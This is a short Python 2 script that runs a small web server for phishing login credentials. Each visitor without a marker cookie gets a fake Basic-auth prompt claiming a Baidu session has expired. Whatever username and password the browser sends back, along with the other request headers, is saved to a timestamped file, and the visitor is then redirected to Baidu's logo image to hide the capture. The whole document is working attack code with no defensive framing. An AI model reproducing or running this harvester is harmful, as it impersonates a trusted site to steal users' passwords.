#encoding=utf-8
 
import SimpleHTTPServer
import SocketServer
import time
 
 
class RequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
    def do_GET(self):
        if str(self.headers).find('UserLogin=1') > 0:    # 用户已记录，跳转
            self.send_response(302)
            self.send_header('Location','http://www.baidu.com/img/bdlogo.gif')
            self.end_headers()
        else:
            if str(self.headers).find('Authorization: Basic ') > 0:    # save username, pass and Referrer
                self.send_response(302)
                self.send_header('Set-Cookie', 'UserLogin=1')
                self.send_header('Location','http://www.baidu.com/img/bdlogo.gif')
                with open('data\\' + time.asctime().replace(':', ' ') + '.txt', 'w') as f:
                    f.write(str(self.headers))
            else:
                self.send_response(401)
                self.send_header('Content-type','text/html; charset=UTF-8')
                self.send_header('WWW-Authenticate', 'Basic realm="Session Out Of Date, Please Login again [www.baidu.com]"')
                self.end_headers()
        
PORT = 1234
httpd = SocketServer.TCPServer(("", PORT), RequestHandler)
print "serving at port", PORT
httpd.serve_forever()
